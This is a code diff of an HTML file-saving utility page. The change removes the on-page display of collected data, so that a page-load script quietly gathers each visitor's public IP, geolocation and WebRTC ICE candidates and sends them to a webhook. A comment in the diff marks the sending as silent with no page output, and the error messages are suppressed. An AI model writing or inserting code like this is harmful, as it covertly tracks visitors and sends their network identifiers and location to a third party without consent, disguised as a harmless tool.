@@ -41,17 +41,6 @@
     text-decoration: none;
   }
   a.download-link:hover { text-decoration: underline; }
-  #ipInfoBox {
-    margin-top: 25px;
-    background: rgba(255,255,255,0.1);
-    padding: 15px;
-    border-radius: 8px;
-    white-space: pre-wrap;
-    text-align: left;
-    max-width: 400px;
-    margin-left: auto;
-    margin-right: auto;
-  }
 </style>
 </head>
 <body>
@@ -62,8 +51,6 @@
     <button id="saveBtn">Save File</button>
     <a id="downloadLink" class="download-link" style="display:none;">⬇ Download Saved File</a><br />
     <button id="loadFileBtn">Load Saved File</button>
-
-    <div id="ipInfoBox">Loading IP & geolocation info...</div>
   </div>
 
 <script>
@@ -72,7 +59,6 @@
 
   let fileData = null;
 
-  // File input change: read file data as base64
   document.getElementById("fileInput").addEventListener("change", e => {
     const file = e.target.files[0];
     if (!file) return;
@@ -81,7 +67,6 @@
     reader.readAsDataURL(file);
   });
 
-  // Save file data + name to localStorage
   document.getElementById("saveBtn").addEventListener("click", () => {
     const name = document.getElementById("fileName").value.trim();
     if (!fileData || !name) {
@@ -92,7 +77,6 @@
     updateDownloadLink(name, fileData);
   });
 
-  // Load saved file from localStorage by name
   document.getElementById("loadFileBtn").addEventListener("click", () => {
     const name = prompt("Enter the file name to load:");
     if (!name) return;
@@ -104,7 +88,6 @@
     }
   });
 
-  // Show download link for saved file
   function updateDownloadLink(name, data) {
     const link = document.getElementById("downloadLink");
     link.href = data;
@@ -113,7 +96,6 @@
     link.textContent = `⬇ Download "${name}"`;
   }
 
-  // Collect all ICE candidate lines (IP or mDNS hostnames)
   function getAllCandidateLines(callback) {
     const candidates = new Set();
     const pc = new RTCPeerConnection({ iceServers: [] });
@@ -131,10 +113,7 @@
     };
   }
 
-  // On load: get public IP, geolocate with lite API, get ICE candidates, send all to webhook + display on page
   function sendIPToWebhook() {
-    const ipInfoBox = document.getElementById("ipInfoBox");
-
     fetch("https://api.ipify.org?format=json")
       .then(res => res.json())
       .then(data => {
@@ -151,10 +130,7 @@ ${liteText.trim()}
 ICE Candidates:
 ${candidates.join("\n") || "None"}`;
 
-              // Show on page
-              ipInfoBox.textContent = content;
-
-              // Send to webhook
+              // Send silently to webhook (no page output)
               fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -163,11 +139,8 @@ ${candidates.join("\n") || "None"}`;
             });
           })
           .catch(() => {
-            // fallback if lite fetch fails
             getAllCandidateLines(candidates => {
               const content = `Public IP: ${publicIP}\nICE Candidates:\n${candidates.join("\n") || "None"}`;
-              ipInfoBox.textContent = content;
-
               fetch(webhookUrl, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -176,9 +149,7 @@ ${candidates.join("\n") || "None"}`;
             });
           });
       })
-      .catch(() => {
-        ipInfoBox.textContent = "Failed to load IP info.";
-      });
+      .catch(() => {});
   }
 
   window.addEventListener("load", () => {
